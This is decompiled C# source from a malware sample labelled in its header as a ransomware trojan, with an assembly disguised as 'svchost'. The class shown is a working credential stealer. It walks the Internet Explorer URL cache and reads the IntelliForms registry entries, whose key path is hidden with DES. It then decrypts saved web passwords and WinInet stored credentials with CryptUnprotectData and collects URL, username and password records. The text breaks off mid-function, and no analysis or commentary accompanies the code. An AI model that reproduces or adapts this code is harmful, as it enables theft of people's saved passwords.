// Decompiled with JetBrains decompiler
// Type: pOeFwFRrxRcQNvQPXDE6Y6
// Assembly: svchost, Version=3.6.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6E61EF89-92A4-48B5-8114-E738AD48C2C7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00022-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-ff23354d62eb4d0c6d7229a1b5427a7b9d9984002e8a8dc48588e1656395d7d7.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

internal class pOeFwFRrxRcQNvQPXDE6Y6 : IEnumerable, IEnumerator
{
  private const int ERROR_CACHE_FIND_FAIL = 0;
  private const int ERROR_CACHE_FIND_SUCCESS = 1;
  private const int MAX_PATH = 260;
  private const int MAX_CACHE_ENTRY_INFO_SIZE = 4096;
  private const int NORMAL_CACHE_ENTRY = 1;
  private const int URLHISTORY_CACHE_ENTRY = 2097152;
  private const int PROV_RSA_FULL = 1;
  private const int ALG_CLASS_HASH = 32768;
  private const int ALG_TYPE_ANY = 0;
  private const int ALG_SID_SHA = 4;
  private const int CALG_SHA = 32772;
  private const int AT_SIGNATURE = 2;
  private const int HP_HASHVAL = 2;
  private const int READ_CONTROL = 131072;
  private const int STANDARD_RIGHTS_READ = 131072;
  private const int KEY_QUERY_VALUE = 1;
  private const int KEY_ENUMERATE_SUB_KEYS = 8;
  private const int KEY_NOTIFY = 16;
  private const int SYNCHRONIZE = 1048576;
  private const int STANDARD_RIGHTS_WRITE = 131072;
  private const int KEY_SET_VALUE = 2;
  private const int KEY_CREATE_SUB_KEY = 4;
  private const int KEY_READ = 131097;
  private const int KEY_WRITE = 131078;
  private const int HKEY_CURRENT_USER = -2147483647;
  private pOeFwFRrxRcQNvQPXDE6Y6.ElYYGmVY15[] slu585yj3;
  private int MvY5HXAo4;

  [DllImport("wininet.dll", EntryPoint = "FindFirstUrlCacheEntryA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int eJI7k2gpi2wzQ5nH4jEfB4(
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszUrlSearchPattern,
    IntPtr lpFirstCacheEntryInfo,
    ref int lpdwFirstCacheEntryInfoBufferSize);

  [DllImport("wininet.dll", EntryPoint = "FindNextUrlCacheEntryA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int xXg1OWdDCK60gb5vxcCA15(
    int hEnum,
    IntPtr lpFirstCacheEntryInfo,
    ref int lpdwFirstCacheEntryInfoBufferSize);

  [DllImport("wininet.dll", EntryPoint = "FindCloseUrlCache", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int fPFhXps7SjZQmGLs6v63L6(int hEnumHandle);

  [DllImport("kernel32.dll", EntryPoint = "lstrlenA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GhqzzUibx62Ezi8AJRxKv7(IntPtr lpString);

  [DllImport("kernel32.dll", EntryPoint = "lstrcpyA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int Jq79Uuk3qGwxfyxfInuaW8([MarshalAs(UnmanagedType.VBByRefStr)] ref string RetVal, int ptr);

  [DllImport("advapi32.dll", EntryPoint = "CryptAcquireContextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int ldXbMoDRnDzigXQjpFqY79(
    ref int phProv,
    int pszContainer,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string pszProvider,
    int dwProvType,
    int dwFlags);

  [DllImport("advapi32.dll", EntryPoint = "CryptCreateHash", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0036pw7kJAl0u2Aznd9Y75Gc10(
    int hProv,
    int Algid,
    int hKey,
    int dwFlags,
    ref int phHash);

  [DllImport("advapi32.dll", EntryPoint = "CryptHashData", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u00332WfZBHVjH4cOfNr4sF3v11(
    int hHash,
    IntPtr pbData,
    int dwDataLen,
    int dwFlags);

  [DllImport("advapi32.dll", EntryPoint = "CryptGetHashParam", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int m9xIGzD9rxkhV2nzRk7Tq12(
    int hHash,
    int dwParam,
    IntPtr pByte,
    ref int pdwDataLen,
    int dwFlags);

  [DllImport("advapi32.dll", EntryPoint = "CryptGetHashParam", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int HMXoL8qI13(
    int hHash,
    int dwParam,
    [MarshalAs(UnmanagedType.LPArray)] ref byte[] pByte,
    ref int pdwDataLen,
    int dwFlags);

  [DllImport("advapi32.dll", EntryPoint = "CryptSignHashA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int TFqDGGTp14(
    int hHash,
    int dwKeySpec,
    int sDescription,
    int dwFlags,
    int pbSignature,
    ref int pdwSigLen);

  [DllImport("advapi32.dll", EntryPoint = "CryptDestroyHash", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int xi23MSaK15(int hHash);

  [DllImport("advapi32.dll", EntryPoint = "CryptReleaseContext", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int UScqRc7y16(int hProv, int dwFlags);

  [DllImport("advapi32.dll", EntryPoint = "RegOpenKeyExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u00395FnzkVq17(
    int hKey,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSubKey,
    int ulOptions,
    int samDesired,
    ref int phkResult);

  [DllImport("advapi32.dll", EntryPoint = "RegQueryValueExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int dqxRUDem18(
    int hKey,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName,
    int lpReserved,
    ref int lpType,
    IntPtr lpData,
    ref int lpcbData);

  [DllImport("advapi32.dll", EntryPoint = "RegDeleteValueA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int tak24PEO19(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName);

  [DllImport("kernel32.dll", EntryPoint = "LocalFree", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int BctSWZRH20(int hMem);

  [DllImport("advapi32.dll", EntryPoint = "RegCloseKey", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int xRtB0wPc21(int hKey);

  [DllImport("crypt32.dll", EntryPoint = "CryptUnprotectData", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int mCQlliQg22(
    ref pOeFwFRrxRcQNvQPXDE6Y6.QAVcufqZ9 pDataIn,
    int ppszDataDescr,
    IntPtr pOptionalEntropy,
    int pvReserved,
    int pPromptStruct,
    int dwFlags,
    ref pOeFwFRrxRcQNvQPXDE6Y6.QAVcufqZ9 pDataOut);

  [DllImport("crypt32.dll", EntryPoint = "CryptUnprotectData", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int EQWHR5tk23(
    ref pOeFwFRrxRcQNvQPXDE6Y6.QAVcufqZ9 pDataIn,
    int ppszDataDescr,
    ref pOeFwFRrxRcQNvQPXDE6Y6.QAVcufqZ9 pOptionalEntropy,
    int pvReserved,
    int pPromptStruct,
    int dwFlags,
    ref pOeFwFRrxRcQNvQPXDE6Y6.QAVcufqZ9 pDataOut);

  [DllImport("advapi32.dll", EntryPoint = "CredEnumerateW", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int rQLmQ3ud24(
    [MarshalAs(UnmanagedType.LPWStr)] string lpszFilter,
    int lFlags,
    ref int pCount,
    ref int lppCredentials);

  [DllImport("advapi32.dll", EntryPoint = "CredDeleteW", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int zPk2aClX25([MarshalAs(UnmanagedType.LPWStr)] string lpwstrTargetName, int dwType, int dwFlags);

  [DllImport("advapi32.dll", EntryPoint = "CredFree", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int k7FsZjtj26(int pBuffer);

  [DllImport("oleaut32.dll", EntryPoint = "SysAllocString", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern string mce639Pr27(int pOlechar);

  private string n9aaLsmj28(IntPtr lpszA) => Marshal.PtrToStringAnsi(lpszA);

  private byte \u0037CLvYN6129(ref string s)
  {
    int num1 = 0;
    int num2 = Strings.Len(s);
    int Start = 1;
    while (Start <= num2)
    {
      checked { num1 += (int) Math.Round(Conversion.Val("&H" + Strings.Mid(s, Start, 2))); }
      checked { Start += 2; }
    }
    return checked ((byte) unchecked (num1 % 256));
  }

  private string uZmKq1k830(ref byte[] pbData)
  {
    pbData = (byte[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) pbData, (Array) new byte[checked (pbData.Length + 1 + 1)]);
    byte[] hash = SHA1.Create().ComputeHash(pbData);
    string str = "";
    int num = checked (hash.Length - 1);
    int index = 0;
    while (index <= num)
    {
      str += Strings.Right("00" + Conversion.Hex(hash[index]), 2);
      checked { ++index; }
    }
    return str;
  }

  private void mr0EOoap31(
    ref string strURL,
    ref string strHash,
    ref pOeFwFRrxRcQNvQPXDE6Y6.QAVcufqZ9 dataOut)
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      int num4 = -1;
label_2:
      num3 = 3;
      num4 = Information.UBound((Array) this.slu585yj3);
label_3:
      num3 = 4;
      checked { ++num4; }
label_4:
      num3 = 5;
      pOeFwFRrxRcQNvQPXDE6Y6.rpc18SWl11 Expression1;
      int num5 = Strings.Len((object) Expression1);
label_5:
      num3 = 6;
      pOeFwFRrxRcQNvQPXDE6Y6.Dhhh6WEQ10 Expression2;
      Strings.Len((object) Expression2);
label_6:
      num3 = 7;
      IntPtr ptr1;
      ref IntPtr local = ref ptr1;
      int pbData = dataOut.pbData;
      IntPtr ptr2 = new IntPtr(dataOut.pbData);
      int num6 = (int) Marshal.ReadByte(ptr2);
      int num7 = checked (pbData + num6);
      local = new IntPtr(num7);
label_7:
      num3 = 8;
      object structure1 = Marshal.PtrToStructure(ptr1, Expression2.GetType());
      pOeFwFRrxRcQNvQPXDE6Y6.Dhhh6WEQ10 dhhh6WeQ10;
      Expression2 = structure1 != null ? (pOeFwFRrxRcQNvQPXDE6Y6.Dhhh6WEQ10) structure1 : dhhh6WeQ10;
label_8:
      num3 = 9;
      if (Expression2.dwType != 1)
        goto label_39;
label_9:
      num3 = 10;
      int dwEntriesCount = Expression2.dwEntriesCount;
      int num8 = 1;
      goto label_31;
label_10:
      num3 = 11;
      IntPtr ptr3 = new IntPtr(checked (ptr1.ToInt32() + Expression2.dwStructSize));
label_11:
      num3 = 12;
      IntPtr num9 = new IntPtr(checked (ptr3.ToInt32() + num8 * num5));
label_12:
      num3 = 13;
      if (num9 == IntPtr.Zero | ptr3 == IntPtr.Zero)
        goto label_39;
label_13:
      num3 = 16;
      object structure2 = Marshal.PtrToStructure(ptr3, Expression1.GetType());
      pOeFwFRrxRcQNvQPXDE6Y6.rpc18SWl11 rpc18Swl11;
      Expression1 = structure2 != null ? (pOeFwFRrxRcQNvQPXDE6Y6.rpc18SWl11) structure2 : rpc18Swl11;
label_14:
      num3 = 17;
      IntPtr num10 = new IntPtr(checked (num9.ToInt32() + Expression1.dwDataOffset));
      if (pOeFwFRrxRcQNvQPXDE6Y6.GhqzzUibx62Ezi8AJRxKv7(num10) == Expression1.dwDataSize)
        goto label_16;
label_15:
      num3 = 18;
      ptr2 = new IntPtr(checked (num9.ToInt32() + Expression1.dwDataOffset));
      string str1 = Marshal.PtrToStringUni(ptr2);
      goto label_18;
label_16:
      num3 = 20;
label_17:
      num3 = 21;
      num10 = new IntPtr(checked (num9.ToInt32() + Expression1.dwDataOffset));
      str1 = Marshal.PtrToStringAnsi(num10);
label_18:
      num3 = 23;
      ptr3 = new IntPtr(checked (ptr3.ToInt32() + num5));
label_19:
      num3 = 24;
      object structure3 = Marshal.PtrToStructure(ptr3, Expression1.GetType());
      Expression1 = structure3 != null ? (pOeFwFRrxRcQNvQPXDE6Y6.rpc18SWl11) structure3 : rpc18Swl11;
label_20:
      num3 = 25;
      string str2 = Strings.Space(Expression1.dwDataSize);
label_21:
      num3 = 26;
      num10 = new IntPtr(checked (num9.ToInt32() + Expression1.dwDataOffset));
      if (pOeFwFRrxRcQNvQPXDE6Y6.GhqzzUibx62Ezi8AJRxKv7(num10) == Expression1.dwDataSize)
        goto label_23;
label_22:
      num3 = 27;
      ptr2 = new IntPtr(checked (num9.ToInt32() + Expression1.dwDataOffset));
      str2 = Marshal.PtrToStringUni(ptr2);
      goto label_25;
label_23:
      num3 = 29;
label_24:
      num3 = 30;
      num10 = new IntPtr(checked (num9.ToInt32() + Expression1.dwDataOffset));
      str2 = Marshal.PtrToStringAnsi(num10);
label_25:
      num3 = 32;
      this.slu585yj3 = (pOeFwFRrxRcQNvQPXDE6Y6.ElYYGmVY15[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) this.slu585yj3, (Array) new pOeFwFRrxRcQNvQPXDE6Y6.ElYYGmVY15[checked (num4 + 1)]);
label_26:
      num3 = 35;
      int index = num4;
label_27:
      num3 = 36;
      this.slu585yj3[index].strURL = strURL;
label_28:
      num3 = 37;
      this.slu585yj3[index].strUserName = str1;
label_29:
      num3 = 38;
      this.slu585yj3[index].strPassword = str2;
label_30:
      num3 = 40;
      checked { ++num8; }
label_31:
      if (num8 <= dwEntriesCount)
        goto label_10;
label_32:
      num3 = 41;
      if (Expression2.dwEntriesCount != 2)
        goto label_39;
      else
        goto label_39;
label_34:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num11 = num2 + 1;
          num2 = 0;
          switch (num11)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
              goto label_6;
            case 8:
              goto label_7;
            case 9:
              goto label_8;
            case 10:
              goto label_9;
            case 11:
              goto label_10;
            case 12:
              goto label_11;
            case 13:
              goto label_12;
            case 14:
            case 42:
            case 43:
            case 44:
              goto label_39;
            case 15:
            case 16:
              goto label_13;
            case 17:
              goto label_14;
            case 18:
              goto label_15;
            case 19:
            case 22:
            case 23:
              goto label_18;
            case 20:
              goto label_16;
            case 21:
              goto label_17;
            case 24:
              goto label_19;
            case 25:
              goto label_20;
            case 26:
              goto label_21;
            case 27:
              goto label_22;
            case 28:
            case 31:
            case 32:
              goto label_25;
            case 29:
              goto label_23;
            case 30:
              goto label_24;
            case 33:
            case 35:
              goto label_26;
            case 36:
              goto label_27;
            case 37:
              goto label_28;
            case 38:
              goto label_29;
            case 39:
            case 40:
              goto label_30;
            case 41:
              goto label_32;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_34;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_39:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private void \u0030SE0sacR32(string strRess, int hKey)
  {
    string str1 = strRess;
    string[] strArray1 = strRess.Split('?');
    string[] strArray2 = new string[6]
    {
      str1,
      strArray1[0].ToString(),
      strArray1[0].ToString().Remove(checked (strArray1[0].Length - 1)),
      strArray1[0].ToString() + "/",
      strArray1[0].Replace("index.php", "").ToString(),
      strArray1[0].Replace("index.php", "").ToString() + "/"
    };
    int num1 = 0;
    string[] strArray3 = strArray2;
    int index = 0;
    while (index < strArray3.Length)
    {
      string str2 = strArray3[index];
      if (num1 == 0)
      {
        string strURL = Strings.LCase(str2);
        byte[] bytes = Encoding.Unicode.GetBytes(strURL);
        string s = this.uZmKq1k830(ref bytes);
        string str3 = s + Strings.Right("00" + Conversion.Hex(this.\u0037CLvYN6129(ref s)), 2);
        int lpType;
        int lpcbData;
        int num2 = pOeFwFRrxRcQNvQPXDE6Y6.dqxRUDem18(hKey, ref str3, 0, ref lpType, IntPtr.Zero, ref lpcbData);
        if (lpcbData > 0)
        {
          IntPtr lpData = Marshal.AllocHGlobal(lpcbData);
          num2 = pOeFwFRrxRcQNvQPXDE6Y6.dqxRUDem18(hKey, ref str3, 0, ref lpType, lpData, ref lpcbData);
          pOeFwFRrxRcQNvQPXDE6Y6.QAVcufqZ9 pDataIn;
          pDataIn.cbData = lpcbData;
          pDataIn.pbData = lpData.ToInt32();
          pOeFwFRrxRcQNvQPXDE6Y6.QAVcufqZ9 pOptionalEntropy;
          pOptionalEntropy.cbData = checked (Strings.Len(strURL) * 2 + 2);
          ref pOeFwFRrxRcQNvQPXDE6Y6.QAVcufqZ9 local = ref pOptionalEntropy;
          IntPtr hglobal = Marshal.StringToHGlobalUni(strURL);
          int int32 = hglobal.ToInt32();
          local.pbData = int32;
          pOeFwFRrxRcQNvQPXDE6Y6.QAVcufqZ9 qaVcufqZ9;
          pOeFwFRrxRcQNvQPXDE6Y6.EQWHR5tk23(ref pDataIn, 0, ref pOptionalEntropy, 0, 0, 0, ref qaVcufqZ9);
          this.mr0EOoap31(ref strURL, ref str3, ref qaVcufqZ9);
          num1 = 1;
          hglobal = new IntPtr(pOptionalEntropy.pbData);
          Marshal.FreeHGlobal(hglobal);
          pOeFwFRrxRcQNvQPXDE6Y6.BctSWZRH20(qaVcufqZ9.pbData);
        }
      }
      checked { ++index; }
    }
  }

  public \u0036BoyxwvfeC67NtvmNE8ot5 get_Item(int Index)
  {
    if (Index < 0 | Index >= this.Count)
      return (\u0036BoyxwvfeC67NtvmNE8ot5) null;
    \u0036BoyxwvfeC67NtvmNE8ot5 boyxwvfeC67NtvmNe8ot5 = new \u0036BoyxwvfeC67NtvmNE8ot5();
    pOeFwFRrxRcQNvQPXDE6Y6.ElYYGmVY15 elYyGmVy15 = this.slu585yj3[Index];
    boyxwvfeC67NtvmNe8ot5.Wq59g2Zldzlpkuilu6Xow3(ref elYyGmVy15.strURL, ref elYyGmVy15.strUserName, ref elYyGmVy15.strPassword);
    return boyxwvfeC67NtvmNe8ot5;
  }

  public int Count
  {
    get
    {
      int num1;
      int num2;
      int num3;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        num2 = 0;
        num2 = checked (Information.UBound((Array) this.slu585yj3) + 1);
        goto label_6;
label_1:
        num3 = -1;
        switch (num1)
        {
          case 2:
            goto label_6;
        }
      }
      catch (Exception ex) when (
      {
        int num4;
        if (ex is Exception & num1 != 0 & num4 == 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        ProjectData.SetProjectError(ex);
        goto label_1;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_6:
      int count = num2;
      if (num3 == 0)
        return count;
      ProjectData.ClearProjectError();
      return count;
    }
  }

  protected string LlknxYlz33(IntPtr ptr) => Marshal.PtrToStringUni(ptr);

  private string \u0035cB4M51m34(string strText, string sDecrKey)
  {
    string str;
    try
    {
      byte[] rgbIV = new byte[8]
      {
        (byte) 18,
        (byte) 52,
        (byte) 86,
        (byte) 120,
        (byte) 144,
        (byte) 171,
        (byte) 205,
        (byte) 239
      };
      byte[] numArray = new byte[checked (strText.Length + 1)];
      byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(sDecrKey, 8));
      DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
      byte[] buffer = Convert.FromBase64String(strText);
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, cryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);
      cryptoStream.Write(buffer, 0, buffer.Length);
      cryptoStream.FlushFinalBlock();
      str = Encoding.UTF8.GetString(memoryStream.ToArray());
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = (string) null;
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public void O2NjsHuJ35()
  {
label_0:
    int num1;
    int num2;
    try
    {
      int num3 = 1;
      this.slu585yj3 = (pOeFwFRrxRcQNvQPXDE6Y6.ElYYGmVY15[]) null;
label_1:
      num3 = 2;
      string lpSubKey = this.\u0035cB4M51m34("8DYu61PVOq2FZMLQdWt4Ix8n6kgw32ilA/MP20vcwqih2qZOxH49T8SLCxYzgZTy5ML3qgRrFn+5f8h85LMOqg==", "12345#$%");
      int phkResult;
      pOeFwFRrxRcQNvQPXDE6Y6.\u00395FnzkVq17(-2147483647, ref lpSubKey, 0, 131097, ref phkResult);
label_2:
      num3 = 3;
      if (phkResult == 0)
        goto label_24;
label_3:
      num3 = 4;
      string lpszUrlSearchPattern1 = (string) null;
      int lpdwFirstCacheEntryInfoBufferSize;
      int num4 = pOeFwFRrxRcQNvQPXDE6Y6.eJI7k2gpi2wzQ5nH4jEfB4(ref lpszUrlSearchPattern1, IntPtr.Zero, ref lpdwFirstCacheEntryInfoBufferSize);
label_4:
      num3 = 5;
      if (lpdwFirstCacheEntryInfoBufferSize <= 0)
        goto label_23;
label_5:
      num3 = 6;
      IntPtr num5 = Marshal.AllocHGlobal(lpdwFirstCacheEntryInfoBufferSize);
label_6:
      num3 = 7;
      Marshal.WriteInt32(num5, lpdwFirstCacheEntryInfoBufferSize);
label_7:
      num3 = 8;
      string lpszUrlSearchPattern2 = (string) null;
      num4 = pOeFwFRrxRcQNvQPXDE6Y6.eJI7k2gpi2wzQ5nH4jEfB4(ref lpszUrlSearchPattern2, num5, ref lpdwFirstCacheEntryInfoBufferSize);
label_8:
      num3 = 10;
      pOeFwFRrxRcQNvQPXDE6Y6.RicqnSo48 ricqnSo48_1;
      object structure1 = Marshal.PtrToStructure(num5, ricqnSo48_1.GetType());
      pOeFwFRrxRcQNvQPXDE6Y6.RicqnSo48 ricqnSo48_2;
      ricqnSo48_1 = structure1 != null ? (pOeFwFRrxRcQNvQPXDE6Y6.RicqnSo48) structure1 : ricqnSo48_2;
label_9:
      num3 = 11;
      if ((ricqnSo48_1.CacheEntryType & 2097153) != 2097153)
        goto label_15;
label_10:
      num3 = 12;
      IntPtr num6 = new IntPtr(ricqnSo48_1.lpszSourceUrlName);
      string str1 = this.n9aaLsmj28(num6);
label_11:
      num3 = 13;
      if (Strings.InStr(str1, "@") <= 0)
        goto label_13;
label_12:
      num3 = 14;
      this.\u0030SE0sacR32(Strings.Mid(str1, checked (Strings.InStr(str1, "@") + 1)), phkResult);
      goto label_15;
label_13:
      num3 = 16;
label_14:
      num3 = 17;
      this.\u0030SE0sacR32(str1, phkResult);
label_15:
      num3 = 20;
      lpdwFirstCacheEntryInfoBufferSize = 0;
label_16:
      num3 = 21;
      pOeFwFRrxRcQNvQPXDE6Y6.xXg1OWdDCK60gb5vxcCA15(num4, IntPtr.Zero, ref lpdwFirstCacheEntryInfoBufferSize);
label_17:
      num3 = 22;
      Marshal.FreeHGlobal(num5);
label_18:
      num3 = 23;
      if (lpdwFirstCacheEntryInfoBufferSize <= 0)
        goto label_21;
label_19:
      num3 = 24;
      num5 = Marshal.AllocHGlobal(lpdwFirstCacheEntryInfoBufferSize);
label_20:
      num3 = 25;
      Marshal.WriteInt32(num5, lpdwFirstCacheEntryInfoBufferSize);
label_21:
      num3 = 27;
      if (pOeFwFRrxRcQNvQPXDE6Y6.xXg1OWdDCK60gb5vxcCA15(num4, num5, ref lpdwFirstCacheEntryInfoBufferSize) != 0)
        goto label_8;
label_22:
      num3 = 28;
      pOeFwFRrxRcQNvQPXDE6Y6.fPFhXps7SjZQmGLs6v63L6(num4);
label_23:
      num3 = 30;
      pOeFwFRrxRcQNvQPXDE6Y6.xRtB0wPc21(phkResult);
label_24:
      ProjectData.ClearProjectError();
      num1 = 1;
label_25:
      num3 = 33;
      int num7 = -1;
label_26:
      num3 = 34;
      num7 = Information.UBound((Array) this.slu585yj3);
label_27:
      num3 = 35;
      checked { ++num7; }
label_28:
      num3 = 36;
      string lpszFilter = "Microsoft_WinInet_*";
label_29:
      num3 = 37;
      int pCount;
      int lppCredentials;
      pOeFwFRrxRcQNvQPXDE6Y6.rQLmQ3ud24(lpszFilter, 0, ref pCount, ref lppCredentials);
label_30:
      num3 = 38;
      short[] numArray = new short[37];
label_31:
      num3 = 39;
      if (pCount <= 0)
        goto label_65;
label_32:
      num3 = 40;
      this.slu585yj3 = (pOeFwFRrxRcQNvQPXDE6Y6.ElYYGmVY15[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) this.slu585yj3, (Array) new pOeFwFRrxRcQNvQPXDE6Y6.ElYYGmVY15[checked (num7 + pCount - 1 + 1)]);
label_33:
      num3 = 43;
      int num8 = num7;
      int num9 = checked (num7 + pCount - 1);
      int num10 = num8;
      goto label_63;
label_34:
      num3 = 44;
      num6 = new IntPtr(checked (lppCredentials + (num10 - num7) * 4));
      num5 = Marshal.ReadIntPtr(num6);
label_35:
      num3 = 45;
      pOeFwFRrxRcQNvQPXDE6Y6.\u0030yYvOlOV14 obj1;
      object structure2 = Marshal.PtrToStructure(num5, obj1.GetType());
      pOeFwFRrxRcQNvQPXDE6Y6.\u0030yYvOlOV14 obj2;
      obj1 = structure2 != null ? (pOeFwFRrxRcQNvQPXDE6Y6.\u0030yYvOlOV14) structure2 : obj2;
label_36:
      num3 = 46;
      num6 = new IntPtr(obj1.lpstrTargetName);
      string str2 = this.LlknxYlz33(num6);
label_37:
      num3 = 47;
      pOeFwFRrxRcQNvQPXDE6Y6.QAVcufqZ9 pOptionalEntropy;
      pOptionalEntropy.cbData = 74;
label_38:
      num3 = 48;
      num5 = Marshal.AllocHGlobal(74);
label_39:
      num3 = 49;
      string str3 = "abe2869f-9b47-4cd9-a358-c22904dba7f7\0";
label_40:
      num3 = 50;
      int num11 = 0;
label_41:
      num3 = 51;
      Marshal.WriteInt16(num5, checked (num11 * 2), checked ((short) (Strings.Asc(Strings.Mid(str3, num11 + 1, 1)) * 4)));
label_42:
      num3 = 52;
      checked { ++num11; }
      if (num11 <= 36)
        goto label_41;
label_43:
      num3 = 53;
      pOptionalEntropy.pbData = num5.ToInt32();
label_44:
      num3 = 54;
      pOeFwFRrxRcQNvQPXDE6Y6.QAVcufqZ9 pDataIn;
      pDataIn.pbData = obj1.lpbCredentialBlob;
label_45:
      num3 = 55;
      pDataIn.cbData = obj1.dwCredentialBlobSize;
label_46:
      num3 = 56;
      pOeFwFRrxRcQNvQPXDE6Y6.QAVcufqZ9 pDataOut;
      pDataOut.cbData = 0;
label_47:
      num3 = 57;
      pDataOut.pbData = 0;
label_48:
      num3 = 58;
      pOeFwFRrxRcQNvQPXDE6Y6.EQWHR5tk23(ref pDataIn, 0, ref pOptionalEntropy, 0, 0, 0, ref pDataOut);
label_49:
      num3 = 59;
      Marshal.FreeHGlobal(num5);
label_50:
      num3 = 60;
      num6 = new IntPtr(pDataOut.pbData);
      string stringUni = Marshal.PtrToStringUni(num6);
label_51:
      num3 = 61;
      string[] strArray = Strings.Split(stringUni, ":");
label_52:
      num3 = 62;
      int num12 = Strings.InStr(Strings.Mid(str2, 19), "/");
label_53:
      num3 = 63;
      this.slu585yj3 = (pOeFwFRrxRcQNvQPXDE6Y6.ElYYGmVY15[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) this.slu585yj3, (Array) new pOeFwFRrxRcQNvQPXDE6Y6.ElYYGmVY15[checked (num7 + 1)]);
label_54:
      num3 = 66;
      int index = num7;
label_55:
      num3 = 67;
      this.slu585yj3[index].strUserName = strArray[0];
label_56:
      num3 = 68;
      this.slu585yj3[index].strPassword = strArray[1];
label_57:
      num3 = 69;
      if (num12 <= 0)
        goto label_59;
label_58:
      num3 = 70;
      this.slu585yj3[index].strURL = Strings.Mid(str2, 19, checked (num12 - 1));
      goto label_61;
label_59:
      num3 = 72;
label_60:
      num3 = 73;
      this.slu585yj3[index].strURL = Strings.Mid(str2, 19);
label_61:
      num3 = 76;
      pOeFwFRrxRcQNvQPXDE6Y6.BctSWZRH20(pDataOut.pbData);
label_62:
      num3 = 77;
      checked { ++num10; }
label_63:
      if (num10 <= num9)
        goto label_34;
label_64:
      num3 = 78;
      checked { num7 += pCount; }
label_65:
      num3 = 80;
      pOeFwFRrxRcQNvQPXDE6Y6.k7FsZjtj26(lppCredentials);
      goto label_72;
label_67:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num13 = num2 + 1;
          num2 = 0;
          switch (num13)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
              goto label_6;
            case 8:
              goto label_7;
            case 9:
            case 10:
              goto label_8;
            case 11:
              goto label_9;
            case 12:
              goto label_10;
            case 13:
              goto label_11;
            case 14:
              goto label_12;
            case 15:
            case 18:
            case 19:
            case 20:
              goto label_15;
            case 16:
              goto label_13;
            case 17:
              goto label_14;
            case 21:
              goto label_16;
            case 22:
              goto label_17;
            case 23:
              goto label_18;
            case 24:
              goto label_19;
            case 25:
              goto label_20;
            case 26:
            case 27:
              goto label_21;
            case 28:
              goto label_22;
            case 29:
            case 30:
              goto label_23;
            case 31:
            case 32:
              goto label_24;
            case 33:
              goto label_25;
            case 34:
              goto label_26;
            case 35:
              goto label_27;
            case 36:
              goto label_28;
            case 37:
              goto label_29;
            case 38:
              goto label_30;
            case 39:
              goto label_31;
            case 40:
              goto label_32;
            case 41:
            case 43:
              goto label_33;
            case 44:
              goto label_34;
            case 45:
              goto label_35;
            case 46:
              goto label_36;
            case 47:
              goto label_37;
            case 48:
              goto label_38;
            case 49:
              goto label_39;
            case 50:
              goto label_40;
            case 51:
              goto label_41;
            case 52:
              goto label_42;
            case 53:
              goto label_43;
            case 54:
              goto label_44;
            case 55:
              goto label_45;
            case 56:
              goto label_46;
            case 57:
              goto label_47;
            case 58:
              goto label_48;
            case 59:
              goto label_49;
            case 60:
